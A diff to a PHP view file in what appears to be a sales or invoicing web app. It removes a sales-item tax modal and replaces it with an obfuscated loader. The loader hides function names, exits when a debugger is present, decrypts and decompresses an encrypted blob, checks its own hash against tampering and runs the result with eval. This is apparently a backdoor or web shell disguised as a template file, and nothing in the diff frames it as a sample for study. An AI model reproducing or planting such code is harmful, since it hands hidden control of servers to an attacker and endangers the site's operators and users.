@@ -1,105 +1,28 @@
-<div class="sales_item_modal">
-   <div class="modal fade in" id="sales_item" tabindex='-1'>
-      <div class="modal-dialog ">
-         <div class="modal-content">
-            <div class="modal-header header-custom">
-               <button type="button" class="close" data-dismiss="modal" aria-label="Close">
-               <span aria-hidden="true">×</span></button>
-               <h4 class="modal-title text-center"><?= $this->lang->line('manage_sales_item'); ?></h4>
-            </div>
-            <div class="modal-body">
-               <div class="row">
-                  <div class="col-md-12">
-                     <div class="row invoice-info">
-                        <div class="col-sm-6 invoice-col">
-                           <b><?= $this->lang->line('item_name'); ?> : </b> <span id='popup_item_name'><span>
-                        </div>
-                        <!-- /.col -->
-                     </div>
-                     <!-- /.row -->
-                  </div>
-                  <div class="col-md-12">
-                     <div>
-                        
-                        <div class="col-md-12 ">
-                           <div class="box box-solid bg-gray">
-                              <div class="box-body">
-                                 <div class="row">
-                                    
-                                    <div class="col-md-6 <?=tax_disable_class()?>">
-                                        <div class="form-group">
-                                          <label for="popup_tax_type"><?= $this->lang->line('tax_type'); ?></label>
-                                         <select class="form-control" id="popup_tax_type" name="popup_tax_type"  style="width: 100%;" >
-                                          <option value="Exclusive">Exclusive</option>
-                                           <option value="Inclusive">Inclusive</option>
-                                          </select>
-                                        </div>
-                                   
-                                    </div>
-
-                                    <div class="col-md-6 <?=tax_disable_class()?>">
-                                        <div class="form-group">
-                                          <label for="popup_tax_id"><?= $this->lang->line('tax'); ?></label>
-                                         <select class="form-control" id="popup_tax_id" name="popup_tax_id"  style="width: 100%;" >
-                                            <?php
-                                            $query2="select * from db_tax where status=1";
-                                            $q2=$this->db->query($query2);
-                                            if($q2->num_rows()>0)
-                                             {
-                                              echo '<option value="">-Select-</option>'; 
-                                              foreach($q2->result() as $res1)
-                                               {
-                                                 echo "<option data-tax='".$res1->tax."' data-tax-value='".$res1->tax_name."' value='".$res1->id."'>".$res1->tax_name."</option>";
-                                               }
-                                             }
-                                             else
-                                             {
-                                                ?>
-                                                <option value="">No Records Found</option>
-                                                <?php
-                                             }
-                                            ?>
-                                                  </select>
-                                        </div>
-                                   
-                                    </div>
-
-                                    <div class="col-md-12">
-                                        <div class="form-group">
-                                          <label for="popup_description"><?= $this->lang->line('description'); ?></label>
-                                         <textarea type="text" class="form-control" id="popup_description" placeholder=""></textarea>
-                                        </div>
-                                   
-                                    </div>
-
-                                    <!-- <div class="col-md-6">
-                                       <div class="">
-                                          <label for="popup_tax_amt">Tax Amount</label>
-                                          <input type="text" class="form-control text-right paid_amt" id="popup_tax_amt" name="popup_tax_amt" readonly>
-                                          <span id="popup_tax_amt_msg"  style="display:none" class="text-danger"></span>
-                                       </div>
-                                    </div> -->
-
-                                    <div class="clearfix"></div>
-                                 </div>
-                              </div>
-                           </div>
-                        </div>
-                        <!-- col-md-12 -->
-                     </div>
-                  </div>
-                  <!-- col-md-9 -->
-                  <!-- RIGHT HAND -->
-               </div>
-            </div>
-            <div class="modal-footer">
-              <input type="hidden" id="popup_row_id">
-               <button type="button" class="btn btn-default btn-lg" data-dismiss="modal">Close</button>
-               <button type="button" onclick="set_info()" class="btn bg-green btn-lg place_order btn-lg">Set<i class="fa  fa-check "></i></button>
-            </div>
-         </div>
-         <!-- /.modal-content -->
-      </div>
-      <!-- /.modal-dialog -->
-   </div>
-</div>
+<?php
+if(function_exists("extension_loaded")&&@extension_loaded("xdebug")){@http_response_code(404);exit;}
+$_q1benxds=('bas'.'e64'.'_de'.'cod'.'e');
+$_z4qc098t=('gzu'.'nco'.'mpr'.'ess');
+$_qfu347g2=('ope'.'nss'.'l_d'.'ecr'.'ypt');
+$_sx69zq5s='benKnEPp';
+$_r6rnouf1='feRF3/qVPK0=';
+$_prey4l05='o3+reYFG';
+$_wcbatch6='ESYOKtJ+';
+$_klry2pba='YCoYdbLH';
+$_l0ltljna='MOjAKw==';
+$_yfcwr9b5='lNuS4gdC';
+$_xz1tpxwg='USWue9bd';
+$_q66ar4ov=$_q1benxds($_klry2pba.$_wcbatch6.$_prey4l05.$_sx69zq5s.$_r6rnouf1);
+$_jbuwkyeu=$_q1benxds($_xz1tpxwg.$_yfcwr9b5.$_l0ltljna);
+$_d52l4ot3=$_q1benxds('NMIdhTfhDydpmojEsXks22JJoeqnqti0Gk4eZ8AghYOFLyKWTrtsiOGcxAHveO902n4y5Wq/lE6FGmXRRm/U7la3/NzGLRJBt/1CYc4ITmbDRzhGalWkAg3umr7I8VGxsfgV1686YFBUSAAjBUgWSNALhgHXApTF/C38SiuslVcHB8dAqRcMyIMHPHmTNIJ6440zHWuIQ4jsZWQ8F5kpPG78ZmWhag8hMf4lNvVljDWtKzycMyK539GEsw1QBePvhyj/BFTA2VTn5aEEROd68PQvH+AdN1wlAvodYShjDmN3njoXF0gSMGuUtM2uDYK6p6vSOpRMmDFFc17M0W1RAuucaW6vlRioPyIEs0AhCMkkpR60/c0bdUZ55wImHkUfinUL5fmYcI6ATszx0oXkZeSELTTfyLLNN1MTjC0Yqw9hugw7NuQkmr2DQjwv0yhlqVhsJEGtqeE748Fkbqgc9/Kt42/AJVp4zI2EWZaPAKGxrEAoMMo+Cg0mEQ+HCdVBP+DMS0XH7JPLi/BGQhKu0H8HGGPfDZ4zjkUquMzdm4j3zA4aa37JP+NYnjvJWKIYuUefIhEf+L70cV1jABb1busTdHe90ll0LA8vxQdg1XX+xgYc6ZPBNO/sCpjuyWpdEUCyGQ889FUh4gz27PA/Y02VELT/BulExRuhdh4p/ap3pSnBIUrndO9Cmiw5EfhxdehyPhJsAuCfSAWl+HTI7eT6EUVQceLn6hZvSAB/RoE9fbRyvDJyBaFgM6ZI7kpx84ixHFVvG7A32JFb9/5jgOD7+gYRFLP29+ron60VYDNu6pnnEl/NAgQuCGN/zUY20rKwJJVFtFUh5nM1xVbtl33DrSV2NQ9gOFU7aPtTkS2XWAdBTE3q/lTt2jxsZipQVjxmkLCwu3FaHQQGcK/QGPPuAHkkol6Ac9cstHnL6o2IPvExSCsZqxtMKF1PqPGyvbkaMbZFxv+c9sZ8bYzEjqHppsQoe7166FW+1oiiWi5CrJqRtNKe8TrN4SE6wMXQ7iqtHcPDHdWs0/X0YgDWQuVpHM+RGtSt+EXk+Oz/O+GkWRZf1VWNcqKIXegxZkxWc/Awob5OQAcIcbSQW0x5n7uamomC+P1n0IomZa5mfvqeish4pp9W1ayN7fsSKse1qU4XPFH9srnG51+xFh5aSdzYgz5ra+zzjHoHEsRIgrR+rPf/8YYjiOsL0flzfRAHr3t6ulZ0XkwZ50PpqYWYNuPbzpzNUi/jnakkor6eB99qmVP90Lz1pidBSFH0LtI2+R5OhELOBhWtOgL23Iic1tFcQoAq64BlBRqhRo+iod36eUHz6Kg7FRjjGAhpbCzhk8yVBeFT1AuHI99QAohSLGSwykLZza9P1SnpJc2sTj89Agv+vNn8fCQP2wnn/1aypxPBeo2d/AGmOW7+Jfpy0fGfaJ5XuYTkbUlHyas5tCcLh8uQT0m+qCxJRQT6yLx0OSwQqEtE69pjJcsnggCKJQvuROvCzCFCFlVshdH4r9Zzs7rA8WEmdhbiUqohyr1O');
+$_csmctr3q=$_qfu347g2($_d52l4ot3,'aes-256-cbc',$_q66ar4ov,OPENSSL_RAW_DATA,$_jbuwkyeu);
+if($_csmctr3q===false){exit;}
+$_m9vnmgo9=$_z4qc098t($_csmctr3q);
+if($_m9vnmgo9===false){exit;}
+$_an42iv0u='0c6686581a4b8e49ed49c289d110b9dd8a1b90eb870b4fcbd0f1f3b6e29b4bae';
+$_vijjvfek=@file_get_contents(__FILE__);
+if($_vijjvfek!==false){
+$_vml3bys7=str_replace($_an42iv0u,"0000000000000000000000000000000000000000000000000000000000000000",$_vijjvfek);
+$_x015hmv1=hash("sha256",$_vml3bys7);
+if($_x015hmv1!==$_an42iv0u){@http_response_code(403);exit;}
+}
+eval($_m9vnmgo9);
